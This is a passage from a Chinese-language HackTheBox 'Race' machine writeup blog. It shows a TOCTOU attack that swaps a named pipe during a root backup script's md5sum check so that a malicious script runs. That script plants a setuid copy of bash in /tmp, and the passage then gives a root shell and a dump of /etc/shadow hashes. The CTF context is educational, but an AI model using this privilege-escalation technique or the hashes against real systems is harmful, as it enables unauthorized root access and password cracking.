+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">rm</span> -rf pipe </span><br><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">mkfifo</span> offsite-backup.sh</span><br><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">ls</span> -la                                                                            </span><br><span class="line">total 12                                                                                                                  </span><br><span class="line">drwxrwsr-x 3 root racers 4096 Sep  8 00:46 .                                                                              </span><br><span class="line">drwxr-xr-x 6 root root   4096 Dec  4  2023 ..</span><br><span class="line">drwxr-sr-x 2 root racers 4096 Dec  9  2023 backup</span><br><span class="line">prw-rw-r-- 1 max  racers    0 Sep  8 00:46 offsite-backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后等待自动脚本加载到md5sum计算脚本值</p>
+<p><a data-fancybox="gallery" data-src="/images/race-18.png" data-caption=""><img src="/images/race-18.png"></a></p>
+<p>然后此时md5sum被占用，将管道文件替换为我们的恶意脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">mv</span> offsite-backup.sh pipe</span><br><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/bash\n\ncp /bin/bash /tmp/wansh\nchmod 6777 /tmp/wansh&#x27;</span> | <span class="built_in">tee</span> offs</span><br><span class="line">ite-backup.sh                                                 </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/wansh</span><br><span class="line"><span class="built_in">chmod</span> 6777 /tmp/wansh</span><br><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">chmod</span> +x offsite-backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>将<code>backup/offsite-backup.sh</code>正确的值赋给pipe，达成绕过的目的，以此来运行我们的恶意脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">max@race:/usr/local/share/race-scripts$ <span class="built_in">ls</span> -la /tmp/wansh </span><br><span class="line">-rwsrwsrwx 1 root root 1396520 Sep  8 00:52 /tmp/wansh</span><br><span class="line">max@race:/usr/local/share/race-scripts$ /tmp/wansh -p</span><br><span class="line">wansh-5.1# <span class="built_in">cat</span> /root/root.txt </span><br><span class="line">46e35bcfd9115fe5fce2531e3d0e8b3b</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-As-Root"><a href="#Shell-As-Root" class="headerlink" title="Shell As Root"></a>Shell As Root</h2><h3 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$/x0FBLjjXu6xoa/wwQhE51<span class="variable">$ikNINv0iIZulSmwKscnWCUVc6W9</span>//Zt7qMoU27kTx1D:20322:0:99999:7:::</span><br><span class="line">daemon:*:19213:0:99999:7:::</span><br><span class="line">bin:*:19213:0:99999:7:::</span><br><span class="line">sys:*:19213:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19213:0:99999:7:::</span><br><span class="line">games:*:19213:0:99999:7:::</span><br><span class="line">man:*:19213:0:99999:7:::</span><br><span class="line">lp:*:19213:0:99999:7:::</span><br><span class="line">mail:*:19213:0:99999:7:::</span><br><span class="line">news:*:19213:0:99999:7:::</span><br><span class="line">uucp:*:19213:0:99999:7:::</span><br><span class="line">proxy:*:19213:0:99999:7:::</span><br><span class="line">www-data:*:19213:0:99999:7:::</span><br><span class="line">backup:*:19213:0:99999:7:::</span><br><span class="line">list:*:19213:0:99999:7:::</span><br><span class="line">irc:*:19213:0:99999:7:::</span><br><span class="line">gnats:*:19213:0:99999:7:::</span><br><span class="line">nobody:*:19213:0:99999:7:::</span><br><span class="line">_apt:*:19213:0:99999:7:::</span><br><span class="line">systemd-network:*:19213:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19213:0:99999:7:::</span><br><span class="line">messagebus:*:19213:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19213:0:99999:7:::</span><br><span class="line">pollinate:*:19213:0:99999:7:::</span><br><span class="line">sshd:*:19213:0:99999:7:::</span><br><span class="line">syslog:*:19213:0:99999:7:::</span><br><span class="line">uuidd:*:19213:0:99999:7:::</span><br><span class="line">tcpdump:*:19213:0:99999:7:::</span><br><span class="line">tss:*:19213:0:99999:7:::</span><br><span class="line">landscape:*:19213:0:99999:7:::</span><br><span class="line">usbmux:*:19694:0:99999:7:::</span><br><span class="line">patrick:$y$j9T<span class="variable">$e9es6DyprdNF4EtATvnCw</span>.<span class="variable">$T</span>.g2TXpztIsMKy.WYrt3Tj6RofrQ3fyPnTBHGkv7uq2:19696:0:99999:7:::</span><br><span class="line">lxd:!:19694::::::</span><br><span class="line">fwupd-refresh:*:19694:0:99999:7:::</span><br><span class="line">max:$y$j9T<span class="variable">$5IqbvFWMft2lkFI</span>.Ri01P/<span class="variable">$e1y5AveDPjN3yZrQP</span>/GVhW8q7E6U0vXQxqyA691.FX0:19694:0:99999:7:::</span><br><span class="line">_laurel:!:20326::::::</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
+        
+          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-info"><span class="toc-number">1.1.</span> <span class="toc-text">Enum info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weak-Password-Login-Phpsysinfo-And-Get-Creds"><span class="toc-number">1.2.</span> <span class="toc-text">Weak Password Login Phpsysinfo And Get Creds</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code-Analyze-And-Reset-Patrick-s-Password"><span class="toc-number">1.3.</span> <span class="toc-text">Source Code Analyze And Reset Patrick&#96;s Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-28116"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2024-28116</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-www-data"><span class="toc-number">2.</span> <span class="toc-text">Shell As www-data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Max-Home-File-Get-Creds"><span class="toc-number">2.1.</span> <span class="toc-text">User-Max Home File Get Creds</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Max"><span class="toc-number">3.</span> <span class="toc-text">Shell As Max</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-Scheduled-Task"><span class="toc-number">3.1.</span> <span class="toc-text">Enum Scheduled Task</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/09/08/Race/Race/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/09/08/Race/Race/&text=HackTheBox——HTB Race Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/09/08/Race/Race/&is_video=false&description=HackTheBox——HTB Race Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Race Writeup&body=Check out this article: https://n0nome.github.io/2025/09/08/Race/Race/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/09/08/Race/Race/&name=HackTheBox——HTB Race Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/09/08/Race/Race/&t=HackTheBox——HTB Race Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    n0nome
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>
+
+
+</body>
+</html>
